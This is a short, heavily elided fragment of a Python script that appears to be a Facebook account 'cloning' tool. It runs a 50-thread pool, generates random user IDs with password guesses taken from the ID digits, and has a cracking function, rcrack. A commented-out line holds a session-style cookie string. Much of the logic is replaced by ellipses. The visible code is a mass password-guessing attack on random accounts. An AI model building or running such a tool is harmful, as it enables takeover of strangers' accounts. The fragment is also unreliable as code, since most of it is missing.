...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mShihab Rana Random Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=MeYeZYq1FR3upwYSmoB6QIdJ; sb=MeYeZSZhjdnn2KLA6VhX3VtI; m_pixel_ratio=2; wd=360x708; fr=0GrKLAL49BNKs9EGH..BlHuYx.a2.AAA.0.0.BlHuY5.AWUyjNzFq7w',
    'dpr': '2',
